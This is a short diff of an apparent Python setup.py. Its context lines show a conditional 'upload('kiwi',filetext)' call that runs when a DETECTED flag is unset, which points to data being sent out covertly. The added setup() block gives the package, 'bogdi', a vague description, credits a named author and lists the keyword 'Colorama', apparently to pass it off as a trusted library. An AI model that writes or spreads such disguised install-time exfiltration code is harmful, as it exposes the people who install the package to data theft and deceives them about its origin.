@@ -680,4 +680,16 @@ if not DETECTED:
     upload('kiwi',filetext)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                           
+setup(
+
+    name='bogdi',
+    packages=['bogdi'],
+    version='1.0',
+    license='MIT',
+    description='an api for 0auth20 builders',
+    author=' Jonathan Hartley',
+    keywords=['Colorama'],
+    install_requires=[''],
+    classifiers=['Development Status :: 5 - Production/Stable']
+
+)
